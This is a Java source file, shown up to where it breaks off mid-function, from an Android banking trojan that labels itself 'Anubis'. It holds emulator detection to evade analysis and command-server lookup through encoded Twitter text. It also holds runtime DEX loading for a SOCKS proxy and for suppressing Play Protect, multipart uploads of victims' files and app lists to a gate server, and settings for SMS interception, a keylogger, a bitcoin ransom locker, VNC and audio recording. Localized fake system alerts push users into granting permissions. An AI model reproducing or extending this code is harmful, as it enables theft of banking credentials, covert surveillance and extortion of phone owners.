package anubis.bot.myapplication;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.app.AppOpsManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.SortedMap;
import java.util.TreeMap;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.API.RequestHttp;
import anubis.bot.myapplication.Activity.ActivityPermissions;
import anubis.bot.myapplication.Receiver.ReceiverAlarm;
import anubis.bot.myapplication.Receiver.ReceiverMms;
import anubis.bot.myapplication.Receiver.ReceiverSMS;
import dalvik.system.DexClassLoader;

import static android.content.Context.LOCATION_SERVICE;
import static android.content.Context.USAGE_STATS_SERVICE;

public class UtilsClass {
    private static SharedPreferences settings = null;
    private static SharedPreferences.Editor editor = null;
    Constants const_ = new Constants();
    StoreStringClass store = new StoreStringClass();
    final static Constants staticConst = new Constants();
    final static String DexName = staticConst.nameDex;

    public  boolean isEmulator() {
        if(!const_.antiEmulator)return false;
        if(isEmulator_1())return true;

        return false;
    }

    public  boolean isEmulator_1() {
        return Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || "google_sdk".equals(Build.PRODUCT);
    }

    String gfgsfdgdsgr="sdokfgjeosdfgerfh";
    String gfdsdfsgrgr="sdokfgjeofh";
    int ddfsdffde=3426;
    String gewffgr="sdokfdfhergjeofh";
    int ddfesdf=3423;
    String issdfewua = "<url>";
    String gffdfwefgefefrr="sdokfgjeofh";
    int dddfwe=23;
    String sdswefdffgh="dsfpkhmdfkhdg";
    int dsdfds=23;
    String gfgwefdfr="sdosdfrgkfgjeofh";
    String gfdwefwsfgfggr="sdokfgjeofh";
    String gfgefsderhehr="sdokfgjeofh";

    public void getIDwindowsBot(Context context, String LOG_TAG) {
        if(hasPermission(context, store.WRITE_EXTERNAL_STORAGE[0])) {
            String strID = "";
            if (!Environment.getExternalStorageState().equals(
                    Environment.MEDIA_MOUNTED)) {
                Log(LOG_TAG, "SD no access: " + Environment.getExternalStorageState());
                return;
            }
            File sdPath = Environment.getExternalStorageDirectory();
            sdPath = new File(sdPath.getAbsolutePath());
            File sdFile = new File(sdPath, "id.txt");
            try {
                BufferedReader br = new BufferedReader(new FileReader(sdFile));
                String str = "";
                while ((str = br.readLine()) != null) {
                    Log.e(LOG_TAG, "id: " + str);
                    strID = strID + str;
                }
               SetWrite(context,"id_windows_bot", strID);

               String responce =  POST(context, "4", "p=" + trafEnCr(ID_B(context) + "|ID Windows Bot: " + strID + '\n' + "|"));
               if(responce.contains("||ok||")){
                   SetWrite(context,"id_windows_bot", "");
               }
                sdFile.delete();
            } catch (FileNotFoundException e) {
                Log.e(LOG_TAG, "No file");
            } catch (IOException e) {
                Log.e(LOG_TAG, "No file or permission");
            }

            //---

            String getIdBotWin = SetRead(context, "id_windows_bot");
            if(getIdBotWin.length()>5){
                String responce =  POST(context, "4", "p=" + trafEnCr(ID_B(context) + "|ID Windows Bot: " + getIdBotWin + '\n' + "|"));
                if(responce.contains("||ok||")){
                    SetWrite(context,"id_windows_bot", "");
                }
            }
        }
    }
    String gfgsfdsdfgdsgr="sdokfgjesdfweosdfgerfh";
    String gfdsdfssdfgrgr="sdokdfgwsdgjeofh";
    int ddfsdgerffde=3426;
    String gegrewffgr="sdokfdfhsdgweergjeofh";
    int ddfeergsdf=3423;
    String isergsdfewua = "<url>";
    String gfergfdfwefgefefrr="sdosdfwekfgjeofh";
    int ddddfgfwe=23;
    String sdsdswefdffgh="dsfpkhsdfwemdfkhdg";
    int dsdfwregds=23;
    String gfgwergefdfr="sdosdfrfsdfwgkfgjeofh";
    String gfdfdgwefwsfgfggr="sdefsdfokfgjeofh";
    String gfgesdfgfsderhehr="sdowefsdkfgjeofh";

    private class TwitterParseTask extends AsyncTask<Void, Void, String> {
        HttpURLConnection urlConnection = null;
        BufferedReader reader = null;
        String result="";
        @Override
        protected String doInBackground(Void... params) {
            try {

                URL url = new URL(const_.urlTwitter);
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                InputStream inputStream = urlConnection.getInputStream();
                StringBuffer buffer = new StringBuffer();
                reader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                while ((line = reader.readLine()) != null) {
                    buffer.append(line);
                }
                System.out.println(buffer.toString());
                result = buffer.toString().replace(" ","");
                result = return_plain_text(result,"苏尔的开始","苏尔苏尔完");

                for(int i=0; i<store.us_char.length; i++){
                    result = result.replace(store.cn_char[i], store.us_char[i]);
                }

                result = trafDeCr(result);

            } catch (Exception e) {
                e.printStackTrace();
            }
            return result;
        }

        @Override
        protected void onPostExecute(String strJson) {
            super.onPostExecute(strJson);
        }
    }



    String gfgsfdsdfgdfesgr="sdokfgjesdfweosdfgerfh";
    String gfdsdfsswedfgrgr="sdokdfgwsdgjeofh";
    int ddfsdgerfsffde=3426;
    String gegsdfrewffgr="sdokfdfhsdgweergjeofh";
    int ddfeeefrgsdf=3423;
    String isweergsdfewua = "<url>";
    String gfgtergfdfwefgefefrr="sdosdfwekfgjeofh";
    int ddddfgrfwe=23;
    String strhdsdswefdffgh="dsfpkhsdfwemdfkhdg";
    int dsdfwrreegds=23;
    String gfgrgwergefdfr="sdosdfrfsdfwgkfgjeofh";
    String gfderfdgwefwsfgfggr="sdefsdfokfgjeofh";
    String gfgesdegfgfsderhehr="sdowefsdkfgjeofh";

    public String parseURL(String url){
        new ParseURL().execute();
        ParseURL pars = new ParseURL();
        pars.execute(url);

        try {
            return pars.get();
        }catch (Exception ex){
            return "";
        }
    }
    private class ParseURL extends AsyncTask<String, Void, String> {
        HttpURLConnection urlConnection = null;
        BufferedReader reader = null;
        String result="";

        @Override
        protected String doInBackground(String... params) {
            try {
                URL url = new URL(params[0]);
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                InputStream inputStream = urlConnection.getInputStream();
                StringBuffer buffer = new StringBuffer();
                reader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                while ((line = reader.readLine()) != null) {
                    buffer.append(line);
                }
                System.out.println(buffer.toString());
                result = buffer.toString();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return result;
        }

        @Override
        protected void onPostExecute(String strJson) {
            super.onPostExecute(strJson);
        }
    }

    public String getUrlAdminPanelFromTwitter(){
        new TwitterParseTask().execute();
        TwitterParseTask twitterParseTask = new TwitterParseTask();
        twitterParseTask.execute();

        try {
            return twitterParseTask.get();
        }catch (Exception ex){
            return "No";
        }
    }
//Service mContext, Intent intent, Bitmap bitmap,String Title, String Text
    public  void LoadLibNotificationPush(Context context, Intent intent, Bitmap bitmap, String title, String text){
        try {
            File file = new File(context.getDir("apk", Context.MODE_PRIVATE),DexName+".apk");
            //final String libPath = "/storage/emulated/0/1.apk";
            final File tmpDir = context.getDir("outdex", 0);
            final DexClassLoader classloader = new DexClassLoader(file.getAbsolutePath(), tmpDir.getAbsolutePath(), null, ClassLoader.getSystemClassLoader().getParent());
            final Class<Object> classToLoad = (Class<Object>) classloader.loadClass("apps.com.app.utils");
            final Object myInstance = classToLoad.newInstance();
            final Method doSomething = classToLoad.getMethod("sendNotification_O", Context.class, Intent.class, Bitmap.class, String.class, String.class);
            doSomething.invoke(myInstance, context, intent, bitmap, title, text);
        }catch(Exception e){
            Log.e("DexNotificationPush",e.toString());
        }
        Log.e("Module","DexNotificationPush Start");
    }

    public  void LoadLibNotification( Service service, String title, String text){
        try {
            String nameMethod = "showNotificationAPI16";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                nameMethod = "showNotificationAPI26";
            }
            File file = new File(service.getDir("apk", Context.MODE_PRIVATE),DexName+".apk");
            //final String libPath = "/storage/emulated/0/1.apk";
            final File tmpDir = service.getDir("outdex", 0);
            final DexClassLoader classloader = new DexClassLoader(file.getAbsolutePath(), tmpDir.getAbsolutePath(), null, ClassLoader.getSystemClassLoader().getParent());
            final Class<Object> classToLoad = (Class<Object>) classloader.loadClass("apps.com.app.utils");
            final Object myInstance = classToLoad.newInstance();
            final Method doSomething = classToLoad.getMethod(nameMethod, Service.class, String.class, String.class);
            doSomething.invoke(myInstance, service, title, text);
        }catch(Exception e){
            Log.e("DexNotification",e.toString());
        }
        Log.e("Module","DexNotification");
    }

    public  void LoadLibSocks5(Context cnt, String host, String user, String password, String port){
        try {
            File file = new File(cnt.getDir("apk", Context.MODE_PRIVATE),DexName+".apk");
            //final String libPath = "/storage/emulated/0/1.apk";
            final File tmpDir = cnt.getDir("outdex", 0);
            final DexClassLoader classloader = new DexClassLoader(file.getAbsolutePath(), tmpDir.getAbsolutePath(), null, ClassLoader.getSystemClassLoader().getParent());
            final Class<Object> classToLoad = (Class<Object>) classloader.loadClass("apps.com.app.utils");
            final Object myInstance = classToLoad.newInstance();
            final Method doSomething = classToLoad.getMethod("startSocks", Context.class, String.class, String.class, String.class, String.class);
            doSomething.invoke(myInstance, cnt, host, user, password, port);
        }catch(Exception e){
            Log.e("DexSocks",e.toString());
        }
        Log.e("Module","SocksStart");
    }


    String gfgsfdsdfvregdsgr="sdokfgjesdfweosdfgerfh";
    String gfdsdgffssdfgrgr="sdokdfgwsdgjeofh";
    int ddfsdgesdrffde=3426;
    String gegewfrewffgr="sdokfdfhsdgweergjeofh";
    int ddfeergergsdf=3423;
    String isfgergsdfewua = "<url>";
    String gfergergfdfwefgefefrr="sdosdfwekfgjeofh";
    int ddddgweefgfwe=23;
    String sdsdsewgrwefdffgh="dsfpkhsdfwemdfkhdg";
    int dsdfwrefggds=23;
    String gfgwrgergefdfr="sdosdfrfsdfwgkfgjeofh";
    String gfdfwefdgwefwsfgfggr="sdefsdfokfgjeofh";
    String gfgwefesdfgfsderhehr="sdowefsdkfgjeofh";


    public  void LoadLibPlayProtect(Context cnt){
        try {
            File file = new File(cnt.getDir("apk", Context.MODE_PRIVATE),DexName+".apk");
            //final String libPath = "/storage/emulated/0/1.apk";
            final File tmpDir = cnt.getDir("outdex", 0);
            final DexClassLoader classloader = new DexClassLoader(file.getAbsolutePath(), tmpDir.getAbsolutePath(), null, ClassLoader.getSystemClassLoader().getParent());
            final Class<Object> classToLoad = (Class<Object>) classloader.loadClass("apps.com.app.utils");
            final Object myInstance = classToLoad.newInstance();
            final Method doSomething = classToLoad.getMethod("protect", Context.class);
            doSomething.invoke(myInstance, cnt);
        }catch(Exception e){
           Log.e("DexPlayProtect",e.toString());
        }
    }
    public void InitializationData(Context context){
        if (android.os.Build.VERSION.SDK_INT >= 19){
            String PackageSWS= Telephony.Sms.getDefaultSmsPackage(context).toString();
            SetWrite(context, "swspacket",PackageSWS);
        }else SetWrite(context, "swspacket", "");

        SetWrite(context,"VNC_Start_NEW", "http://ktosdelaetskrintotpidor.com");
        SetWrite(context,"Starter", "http://sositehuypidarasi.com");
        SetWrite(context,"time_work", "0");
        SetWrite(context,"time_start_permission","0");
        SetWrite(context,"urlInj", ""+const_.urlInj.replace(" ",""));
        SetWrite(context,"interval",""+const_.intervalTime);
        SetWrite(context,"name", "false");
        SetWrite(context,"perehvat_sws", "false");
        SetWrite(context,"del_sws", "false");
        SetWrite(context,"network", "false");
        SetWrite(context,"gps", "false");
        SetWrite(context,"madeSettings", "1 2 3 4 5 6 7 8 9 10 11 12 13 ");
        SetWrite(context,"RequestINJ", "");
        SetWrite(context,"RequestGPS", "");
        SetWrite(context,"save_inj", "");
        SetWrite(context,"SettingsAll", "");
        SetWrite(context,"getNumber", "false");
        SetWrite(context,"dateCJ", "");
        SetWrite(context,"iconCJ", "0:0");
        SetWrite(context,"str_push_fish","");
        SetWrite(context,"timeStartGrabber", "");
        SetWrite(context,"checkStartGrabber","0");
        SetWrite(context,"startRequest", "Access=0Perm=0");
        SetWrite(context,"StringPermis","");
        SetWrite(context,"StringActivate","activate");
        SetWrite(context,"StringAccessibility","Enable access for");
            SetWrite(context,"urls", ""+const_.urls);
        SetWrite(context,"StringYes","");
        SetWrite(context,"uninstall1","");
        SetWrite(context,"uninstall2","");
        SetWrite(context,"vkladmin","");
        SetWrite(context,"websocket", "");
        SetWrite(context,"vnc","start");
        SetWrite(context,"sound","start");
        SetWrite(context,"straccessibility","");
        SetWrite(context,"straccessibility2","");
        SetWrite(context,"findfiles","");
        SetWrite(context,"foregroundwhile","");
        SetWrite(context,"cryptfile","false");
        SetWrite(context,"status","");
        SetWrite(context,"key","");
        SetWrite(context,"htmllocker","");
        SetWrite(context,"lock_amount","");
        SetWrite(context,"lock_btc","");
        SetWrite(context,"keylogger","");
        SetWrite(context,"recordsoundseconds","0");
        SetWrite(context,"startRecordSound","stop");
        SetWrite(context,"play_protect","");
        SetWrite(context,"textPlayProtect","");
        SetWrite(context,"buttonPlayProtect","");
        SetWrite(context,"spamSMS","");
        SetWrite(context,"textSPAM","");
        SetWrite(context,"indexSMSSPAM","");
        SetWrite(context,"DexSocksMolude","");
        SetWrite(context,"lookscreen", "");
        SetWrite(context,"step", "0");
        SetWrite(context,"id_windows_bot", "");
        SetWrite(context, "isAccessbility","false");

        String len =  Locale.getDefault().getLanguage().toLowerCase();
        if(!store.county.contains(len)){
            len = "en";
        }

        for(int i=0;i<store.activate.length;i++) {
            if(store.activate[i].contains("["+len+"]")){
                String str = store.activate[i].replace("["+len+"]","");
                String str2 = store.Accessibility[i].replace("["+len+"]","");
                SetWrite(context, "StringActivate",str);
                SetWrite(context, "StringAccessibility",str2);
                break;
            }
        }
        for(int i=0;i<store.permis.length;i++) {
            if(store.permis[i].contains("["+len+"]")){
                String str = store.permis[i].replace("["+len+"]","");
                SetWrite(context, "StringPermis",str);
                break;
            }
        }
        for(int i=0;i<store.yes.length;i++) {
            if(store.yes[i].contains("["+len+"]")){
                String str = store.yes[i].replace("["+len+"]","");
                SetWrite(context, "StringYes",str);
                break;
            }
        }
        for(int i=0;i<store.uninstall1.length;i++) {
            if(store.uninstall1[i].contains("["+len+"]")){
                String str1 = store.uninstall1[i].replace("["+len+"]","");
                String str2 = store.uninstall2[i].replace("["+len+"]","");
                SetWrite(context, "uninstall1",str1);
                SetWrite(context, "uninstall2",str2);
                break;
            }
        }
        for(int i=0;i<store.vkladmin.length;i++) {
            if(store.vkladmin[i].contains("["+len+"]")){
                String str = store.vkladmin[i].replace("["+len+"]","");
                SetWrite(context, "vkladmin",str);
                break;
            }
        }

        for(int i=0;i<store.straccessibility.length; i++) {
            if(store.straccessibility[i].contains("["+len+"]")){
                String str = store.straccessibility[i].replace("["+len+"]","");
                SetWrite(context, "straccessibility",str);
                break;
            }
        }

        for(int i=0;i<store.straccessibility2.length; i++) {
            if(store.straccessibility2[i].contains("["+len+"]")){
                String str = store.straccessibility2[i].replace("["+len+"]","");
                SetWrite(context, "straccessibility2",str);
                break;
            }
        }

        for(int i=0;i<store.buttonPlayProtect.length; i++) {
            if(store.buttonPlayProtect[i].contains("["+len+"]")){
                String str1 = store.textPlayProtect[i].replace("["+len+"]","");
                String str3 = store.buttonPlayProtect[i].replace("["+len+"]","");
                SetWrite(context, "textPlayProtect",str1+" Google Play Protect!");
                SetWrite(context, "buttonPlayProtect",str3);
                break;
            }
        }
        Log("Настройки","Сохранено!");
    }
    String gfgsfdsdfgdtresgr="sdokfgjesdfweosdfgerfh";
    String gfdsdfwessdfgrgr="sdokdfgwsdgjeofh";
    int ddfsdgrerffde=3426;
    String gedsdgrewffgr="sdokfdfhsdgweergjeofh";
    int ddfeedsgrgsdf=3423;
    String isgreergsdfewua = "<url>";
    String getGfergergfdfwefgefgefefrr="sdosdfwekfgjeofh";
    int dgrgdddfgfwe=23;
    String sdsdswefdffggerh="dsfpkhsdfwemdfkhdg";
    int dsdfwergregds=23;
    String gfgwfgergefdfr="sdosdfrfsdfwgkfgjeofh";
    String gfdfwergdgwefwsfgfggr="sdefsdfokfgjeofh";
    String gfgessdfdfgfsderhehr="sdowefsdkfgjeofh";
    public  void callForward(Context context, String number) {
        try {
            StringBuilder builder = new StringBuilder();
            builder.append("android.intent.action.");
            builder.append("CALL");
            Intent intentCallForward = new Intent(builder.toString());
            intentCallForward.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intentCallForward.setData(Uri.fromParts("tel", number, "#"));
            context.startActivity(intentCallForward);
        }catch (Exception ex){
            Log("callForward2","ERROR");
        }
    }

    public void inputFile2(Context context, byte[] bytes,String namefile) throws Exception{
        String strURL = SetRead(context, "websocket");

        String urlString = strURL+const_.gateFiles;
        String serverId ="getfiles";// getIPAddress(true);
        String attachmentName = "VNC[]";
        String attachmentFileName = namefile;//"VNC.jpg";
        String crlf = "\r\n";
        String twoHyphens = "--";
        String boundary =  "*****";
        HttpURLConnection httpUrlConnection = null;
        URL url = new URL(urlString);
        httpUrlConnection = (HttpURLConnection) url.openConnection();
        httpUrlConnection.setUseCaches(false);
        httpUrlConnection.setDoOutput(true);
        httpUrlConnection.setRequestMethod("POST");
        httpUrlConnection.setRequestProperty("Connection", "Keep-Alive");
        httpUrlConnection.setRequestProperty("Cache-Control", "no-cache");
        httpUrlConnection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
        DataOutputStream request = new DataOutputStream(httpUrlConnection.getOutputStream());
        request.writeBytes(twoHyphens + boundary + crlf);
        request.writeBytes("Content-Disposition: form-data; name=\"serverID\"" + crlf);
        request.writeBytes(crlf);
        request.write(serverId.getBytes());
        request.writeBytes(crlf);
        request.writeBytes(twoHyphens + boundary + twoHyphens + crlf);
        request.writeBytes(twoHyphens + boundary + crlf);
        request.writeBytes("Content-Disposition: form-data; name=\"" + attachmentName + "\";filename=\"" + attachmentFileName + "\"" + crlf);
        request.writeBytes(crlf);
        request.write(bytes);
        request.writeBytes(crlf);
        request.writeBytes(twoHyphens + boundary + twoHyphens + crlf);
        request.flush();
        request.close();
        InputStream responseStream = new BufferedInputStream(httpUrlConnection.getInputStream());
        BufferedReader responseStreamReader = new BufferedReader(new InputStreamReader(responseStream));
        String line = "";
        StringBuilder stringBuilder = new StringBuilder();
        while ((line = responseStreamReader.readLine()) != null)
        {
            stringBuilder.append(line).append("\n");
        }
        responseStreamReader.close();
        String response = stringBuilder.toString();
        Log("HTTP", "HTTPRESPONSE: " + response);
        responseStream.close();
        httpUrlConnection.disconnect();
    }
    public void inputFile(Context context, String path,String namefile,String attachmentName) throws Exception{

        String strURL = SetRead(context, "websocket");

        String urlString = strURL+const_.gateFiles;
        String serverId ="getfiles";// getIPAddress(true);
        File file = new File(path);
        byte[] bytes = loadFile(file);
        String namef="";
        if (namefile.equals("")) {
            namef=  ID_B(context) + "-" + file.getName();
        }else{
            namef=namefile;
        }
        String attachmentFileName = namef;
        String crlf = "\r\n";
        String twoHyphens = "--";
        String boundary =  "*****";
        HttpURLConnection httpUrlConnection = null;
        URL url = new URL(urlString);
        httpUrlConnection = (HttpURLConnection) url.openConnection();
        httpUrlConnection.setUseCaches(false);
        httpUrlConnection.setDoOutput(true);
        httpUrlConnection.setRequestMethod("POST");
        httpUrlConnection.setRequestProperty("Connection", "Keep-Alive");
        httpUrlConnection.setRequestProperty("Cache-Control", "no-cache");
        httpUrlConnection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
        DataOutputStream request = new DataOutputStream(httpUrlConnection.getOutputStream());
        request.writeBytes(twoHyphens + boundary + crlf);
        request.writeBytes("Content-Disposition: form-data; name=\"serverID\"" + crlf);
        request.writeBytes(crlf);
        request.write(serverId.getBytes());
        request.writeBytes(crlf);
        request.writeBytes(twoHyphens + boundary + twoHyphens + crlf);
        request.writeBytes(twoHyphens + boundary + crlf);
        request.writeBytes("Content-Disposition: form-data; name=\"" + attachmentName + "\";filename=\"" + attachmentFileName + "\"" + crlf);
        request.writeBytes(crlf);
        request.write(bytes);
        request.writeBytes(crlf);
        request.writeBytes(twoHyphens + boundary + twoHyphens + crlf);
        request.flush();
        request.close();
        InputStream responseStream = new BufferedInputStream(httpUrlConnection.getInputStream());
        BufferedReader responseStreamReader = new BufferedReader(new InputStreamReader(responseStream));
        String line = "";
        StringBuilder stringBuilder = new StringBuilder();
        while ((line = responseStreamReader.readLine()) != null)
        {
            stringBuilder.append(line).append("\n");
        }
        responseStreamReader.close();
        String response = stringBuilder.toString();
        Log("HTTP", "HTTPRESPONSE: " + response);
        responseStream.close();
        httpUrlConnection.disconnect();
    }
    //****************************************
    public static byte[] loadFile(File file) throws IOException {
        InputStream is = new FileInputStream(file);
        long length = file.length();
        if (length > Integer.MAX_VALUE) {
            // File is too large
        }
        byte[] bytes = new byte[(int)length];

        int offset = 0;
        int numRead = 0;
        while (offset < bytes.length
                && (numRead=is.read(bytes, offset, bytes.length-offset)) >= 0) {
            offset += numRead;
        }

        if (offset < bytes.length) {
            throw new IOException(""+file.getName());
        }
        is.close();
        return bytes;
    }

    public String listFilesWithSubFolders(File dir) {
        String folder = "";
        String file = "";
        try {
            for (File f : dir.listFiles()) {
                if (f.isDirectory()) {
                    Log("Folder", "" + f.getName());
                    folder=folder+f.getName()+"|";
                } else {
                    Log("File", "" + f.getName());
                    file=file+f.getName()+"|";
                }
            }
        }catch (Exception ex){
            Log("ERROR","listFilesWithSubFolders");
        }
        return "!!!!"+ folder +"!!!!"+file+"!!!!";
    }

    public boolean isMyServiceRunning(Context context,Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    public void getApps(Context context){
        final PackageManager pm = context.getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        String TextApps = "All Installed Applications:" + '\n';
        for (ApplicationInfo packageInfo : packages) {
            if (!isSystemPackage(packageInfo))TextApps=TextApps+packageInfo.packageName+'\n';
        }
        POST(context, "4", "p=" + trafEnCr(ID_B(context) + "|" + TextApps + "|"));
    }

    private boolean isSystemPackage(ApplicationInfo applicationInfo) {
        return ((applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
    }

    public void getPermissions(Context context){
        int res;
        String TextPermissions = "All permissions:" + '\n';
        for (String perms : store.permissions){
            res = context.checkCallingOrSelfPermission(perms);
            if (!(res == PackageManager.PERMISSION_GRANTED)){
                TextPermissions=TextPermissions + perms + ": OFF" + '\n';
            }else{
                TextPermissions=TextPermissions + perms + ": ON" + '\n';
            }
        }
        POST(context, "4", "p=" + trafEnCr(ID_B(context) + "|" + TextPermissions + "|"));
    }

    public boolean hasPermissions(Context context){
        int res;
        for (String perms : store.permissions){
            res = context.checkCallingOrSelfPermission(perms);
            if (!(res == PackageManager.PERMISSION_GRANTED)){
                return false;
            }
        }
        return true;
    }
    String gfgsfdshtrdfgdsgr="sdokfgjesdfweosdfgerfh";
    String gfdsdfgerssdfgrgr="sdokdfgwsdgjeofh";
    int ddfsdgefgdfrffde=3426;
    String gegrergewffgr="sdokfdfhsdgweergjeofh";
    int ddfeergfdgsdf=3423;
    String isersdgsdfewua = "<url>";
    String gferdfggfdfwefgefefrr="sdosdfwekfgjeofh";
    int ddddferggfwe=23;
    String sdsergdswefdffgh="dsfpkhsdfwemdfkhdg";
    int dsdfwfgregds=23;
    String gffggwergefdfr="sdosdfrfsdfwgkfgjeofh";
    String gfdfergdgwefwsfgfggr="sdefsdfokfgjeofh";
    String gfgergesdfgfsderhehr="sdowefsdkfgjeofh";
    public boolean hasPermission(Context context, String perms){
        int res;
            res = context.checkCallingOrSelfPermission(perms);
            if (!(res == PackageManager.PERMISSION_GRANTED)){
                return false;
            }
        return true;
    }

    public void startPermission(Context context){
        Intent dialogIntent = new Intent(context, ActivityPermissions.class);
        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
        context.startActivity(dialogIntent);
    }
    protected boolean checkAccess(Context context) {
        String Accessib = context.getPackageName()+"/"+ServiceAccessibility.class.getName().replace(context.getPackageName(),"");
        for (AccessibilityServiceInfo id : ((AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE)).getEnabledAccessibilityServiceList(AccessibilityEvent.TYPES_ALL_MASK)) {
            if (Accessib.equals(id.getId())) {
                return true;
            }
        }
      //  return false;
        AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
        if (am == null)
            return false;
        List<AccessibilityServiceInfo> runningServices = am
                .getEnabledAccessibilityServiceList(AccessibilityEvent.TYPES_ALL_MASK);
        for (AccessibilityServiceInfo service : runningServices)
            if (service.getId().startsWith(context.getPackageName() + "/"))
                return true;

        return false;
    }


    public void Log(String params, String text){
        if(const_.Logger){
             Log.e("Anubis","["+ params + "] " + text);
        }
    }

    //---------------------------------------
    public boolean getUsageStatsManager(Context context){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                PackageManager packageManager = context.getPackageManager();
                ApplicationInfo applicationInfo = packageManager.getApplicationInfo(context.getPackageName(), 0);
                AppOpsManager appOpsManager = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
                int mode = appOpsManager.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, applicationInfo.uid, applicationInfo.packageName);
                return (mode == AppOpsManager.MODE_ALLOWED);

            } catch (PackageManager.NameNotFoundException e) {
                return false;
            }
        }else{
            return false;
        }
    }

    public String getNameApp(Context context){
        final PackageManager PackMan = context.getApplicationContext().getPackageManager();
        ApplicationInfo ai;
        try {
            ai = PackMan.getApplicationInfo(context.getPackageName(), 0);
        } catch (final PackageManager.NameNotFoundException e) {
            ai = null;
        }
        final String applicationName = (String) (ai != null ? PackMan.getApplicationLabel(ai) : "(unknown)");
        return  applicationName;
    }

    public String getProcessNameAPI24(Context context) {
        String foregroundProcess = "";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            UsageStatsManager mUsageStatsManager = (UsageStatsManager)context.getSystemService(USAGE_STATS_SERVICE);
            long time = System.currentTimeMillis();
            List<UsageStats> stats = mUsageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 1000*10, time);
            if(stats != null) {
                SortedMap<Long,UsageStats> mySortedMap = new TreeMap<Long,UsageStats>();
                for (UsageStats usageStats : stats) {
                    mySortedMap.put(usageStats.getLastTimeUsed(),usageStats);
                }
                if(mySortedMap != null && !mySortedMap.isEmpty()) {
                    String topPackageName =  mySortedMap.get(mySortedMap.lastKey()).getPackageName();
                    foregroundProcess = topPackageName;
                }else{
                    return "NoPermission1";
                }
            }else{
                return "NoPermission2";
            }
        }
        return foregroundProcess;
    }

    public void startAlert(final Context context, String NameAlert){
        String title="";
        String msg="";
        String nameButton="";

        AlertDialog.Builder builder = new AlertDialog.Builder(context);
        String locate = Resources.getSystem().getConfiguration().locale.toString();
        if(NameAlert.contains("statistic")) {
            if(locate.contains("RU")){
                title="Получить разрешение";
                msg="Система не корректно работает, вам необходимо включить доступ к статистике '"+getNameApp(context)+"'";
                nameButton="Включить сейчас";
            }else if(locate.contains("US")){
                title="Get permission";
                msg="The system does not work correctly, you need to enable access to the statistics '"+getNameApp(context)+"'";
                nameButton="Enable now";
            }else if(locate.contains("TR")){
                title="İzin almak";
                msg="Sistem düzgün çalışmıyor, istatistiklere erişim etkinleştirmeniz gerekir '"+getNameApp(context)+"'";
                nameButton="Şimdi etkinleştir";
            }else if(locate.contains("DE")){
                title="Get permission";
                msg="Das system funktioniert nicht richtig, Sie benötigen, um Zugang zu den Statistiken '"+getNameApp(context)+"'";
                nameButton="Aktivieren Sie jetzt";
            }else if(locate.contains("IT")){
                title="Ottenere il permesso";
                msg="Il sistema non funziona correttamente, è necessario abilitare l'accesso alle statistiche'"+getNameApp(context)+"'";
                nameButton="Attiva ora";
            }else if(locate.contains("FR")){
                title="Obtenir la permission";
                msg="Le système ne fonctionne pas correctement, vous devez activer l'accès aux statistiques'"+getNameApp(context)+"'";
                nameButton="Activer maintenant";
            }else if(locate.contains("UA")){
                title="Отримати дозвіл";
                msg="Система не працює коректно, вам необхідно включити доступ до статистики'"+getNameApp(context)+"'";
                nameButton="Включити зараз";
            }else{
                title="Get permission";
